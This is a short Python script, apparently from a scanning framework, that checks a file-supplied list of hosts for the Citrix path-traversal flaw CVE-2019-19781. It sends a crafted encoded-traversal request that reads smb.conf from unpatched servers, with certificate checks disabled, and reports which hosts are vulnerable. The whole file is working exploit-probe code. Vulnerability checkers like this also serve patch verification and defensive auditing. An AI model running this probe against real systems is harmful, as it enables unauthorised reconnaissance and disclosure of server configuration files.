import requests


def Submit(url):
    with requests.Session() as s:
        r = requests.Request(method='GET', url=url)
        prep = r.prepare()
        prep.url = url
        return s.send(prep, verify=False, timeout=2)


def Scan(ip, port):
    try:
        print("Scanning for CVE-2019-19781 on: %s        " % ip, end="\r")  # Cleaning up output a little
        if port == "80":
            url = ("http://%s:%s/vpn/js/%%2e./.%%2e/%%76pns/cfg/smb.conf" % (ip, port))
            req = Submit(url)
        else:
            url = ("https://%s:%s/vpn/js/%%2e./.%%2e/%%76pns/cfg/smb.conf" % (ip, port))
            req = Submit(url)
        if "[global]" in str(req.content) and "encrypt passwords" in str(req.content) and (
                "name resolve order") in str(req.content):
            print("Server: %s is still vulnerable to CVE-2019-19781." % ip)
            return ip
        elif "Citrix" in str(req.content) or "403" in str(req.status_code):
            print("Server: %s is not vulnerable." % ip)
            return
    except requests.ReadTimeout:
        return
    except requests.ConnectTimeout:
        return
    except requests.ConnectionError:
        return


def Exploit(target_list):
    server = []
    for target in target_list:
        ip = target[0]
        port = target[1]
        ret = Scan(ip, port)
        if ret:
            server.append("{} is vulnerable to CVE-2019-19781.".format(ret))
        # else:
        #     server.append('{} is not vulnerable'.format(ip))
    return server


if __name__ == '__main__':
    from Utilization.format_target import Format

    test = Format()
    test.ImportTargetFromFile('test.txt')
    Exploit(test.GetTarget())
    del test
